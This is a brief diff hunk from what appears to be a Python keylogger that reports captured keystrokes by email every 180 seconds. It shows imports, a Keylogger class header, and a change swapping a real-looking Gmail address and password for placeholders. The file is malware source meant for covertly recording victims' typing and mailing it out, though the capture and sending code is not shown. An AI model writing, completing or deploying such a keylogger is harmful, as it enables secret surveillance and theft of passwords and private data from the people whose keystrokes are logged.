@@ -9,8 +9,8 @@ import keyboard
 import smtplib
 from threading import Semaphore, Timer 
 SEND_REPORT_EVERY= 180
-EMAIL_ADDRESS = "randomhuman699669@gmail.com" 
-EMAIL_PASSWORD ="holy#shit" 
+EMAIL_ADDRESS = "somemailaddress" 
+EMAIL_PASSWORD ="someshitpassword" 
 class Keylogger: 
     def __init__(self, interval): 
         self.interval = interval 
